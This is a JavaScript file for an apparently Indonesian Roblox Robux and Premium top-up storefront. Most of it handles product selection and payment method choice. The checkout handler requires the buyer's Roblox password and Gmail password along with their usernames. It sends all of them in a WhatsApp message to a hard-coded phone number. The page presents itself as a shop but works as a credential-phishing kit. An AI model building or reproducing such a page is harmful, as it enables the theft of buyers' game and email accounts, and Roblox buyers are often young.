/* =========================
   AMBIL ELEMENT
========================= */

// Menu
const menuItems = document.querySelectorAll(".menu-item");

// Section
const robuxSection = document.querySelector(".robux-section");
const premiumSection = document.querySelector(".premium-section");
const paymentSection = document.getElementById("paymentSection");

// Produk
const priceItems = document.querySelectorAll(".price-item");

// Total
const totalPriceEl = document.getElementById("totalPrice");

// Button
const payBtn = document.getElementById("payBtn");
const payNowBtn = document.getElementById("payNowBtn");
const consultBtn = document.getElementById("consultBtn");

// Metode pembayaran
const paymentItems = document.querySelectorAll(".payment-item");

/* =========================
   DEFAULT STATE
========================= */
robuxSection.style.display = "block";
premiumSection.style.display = "none";
totalPriceEl.innerText = "Rp 0";

let selectedProduct = null;
let selectedPayment = null;

/* =========================
   HELPER
========================= */
function scrollToSection(el) {
  el.scrollIntoView({ behavior: "smooth", block: "start" });
}

function clearActiveProducts() {
  priceItems.forEach(item => {
    item.classList.remove("active");
    const cancel = item.querySelector(".cancel-btn");
    if (cancel) cancel.remove();
  });
}

function clearPaymentActive() {
  paymentItems.forEach(item => item.classList.remove("active"));
}

/* =========================
   MENU CLICK
========================= */
menuItems[0].addEventListener("click", () => {
  robuxSection.style.display = "block";
  premiumSection.style.display = "none";
  scrollToSection(robuxSection);
});

menuItems[1].addEventListener("click", () => {
  robuxSection.style.display = "none";
  premiumSection.style.display = "block";
  scrollToSection(premiumSection);
});

/* =========================
   PILIH PRODUK → TOTAL
========================= */
priceItems.forEach(item => {
  item.addEventListener("click", (e) => {
    if (e.target.classList.contains("cancel-btn")) return;

    clearActiveProducts();

    const productName = item.querySelectorAll("span")[0].innerText;
    const priceText = item.querySelectorAll("span")[1].innerText;

    item.classList.add("active");
    totalPriceEl.innerText = priceText;
    selectedProduct = productName;

    // tombol ❌ cancel
    const cancelBtn = document.createElement("span");
    cancelBtn.className = "cancel-btn";
    cancelBtn.innerText = "✕";

    cancelBtn.addEventListener("click", (ev) => {
      ev.stopPropagation();
      clearActiveProducts();
      totalPriceEl.innerText = "Rp 0";
      selectedProduct = null;
    });

    item.appendChild(cancelBtn);
  });
});

/* =========================
   PAY → SCROLL KE PEMBAYARAN
========================= */
payBtn.addEventListener("click", () => {
  if (!selectedProduct) {
    alert("Pilih produk terlebih dahulu");
    return;
  }
  scrollToSection(paymentSection);
});

/* =========================
   PILIH METODE PEMBAYARAN
========================= */
paymentItems.forEach(item => {
  item.addEventListener("click", () => {
    clearPaymentActive();
    item.classList.add("active");
    selectedPayment = item.querySelector("span").innerText;
  });
});

/* =========================
   BAYAR SEKARANG → WHATSAPP
========================= */
payNowBtn.addEventListener("click", () => {
  if (!selectedProduct) {
    alert("Produk belum dipilih");
    return;
  }

  if (!selectedPayment) {
    alert("Pilih metode pembayaran terlebih dahulu");
    return;
  }

  // Ambil input akun
  const robloxUsername = document.getElementById("robloxUsername")?.value.trim();
  const robloxPassword = document.getElementById("robloxPassword")?.value.trim();
  const gmailUser = document.getElementById("gmailUser")?.value.trim();
  const gmailPassword = document.getElementById("gmailPassword")?.value.trim();

  if (!robloxUsername || !robloxPassword || !gmailUser || !gmailPassword) {
    alert("Username & Password Roblox serta Gmail wajib diisi");
    return;
  }

  const totalHarga = totalPriceEl.innerText;
  const nomorWA = "6281809730331";

  const pesan =
`Halo kak 👋

Saya ingin melakukan pemesanan dengan detail berikut:

📦 Produk :
${selectedProduct}

💳 Metode Pembayaran :
${selectedPayment}

👤 Username Roblox :
${robloxUsername}

🔐 Password Roblox :
${robloxPassword}

📧 Gmail :
${gmailUser}

🔑 Password Gmail :
${gmailPassword}

💰 Total Pembayaran :
${totalHarga}

Mohon diproses ya kak 🙏
Terima kasih.`;

  const urlWA = `https://wa.me/${nomorWA}?text=${encodeURIComponent(pesan)}`;
  window.open(urlWA, "_blank");
});


/* =========================
   KONSULTASI → WHATSAPP
========================= */
consultBtn.addEventListener("click", () => {
  const nomorWA = "6281809730331";
  const pesan = "kak saya ingin konsultasi";

  const urlWA = `https://wa.me/${nomorWA}?text=${encodeURIComponent(pesan)}`;
  window.open(urlWA, "_blank");
});
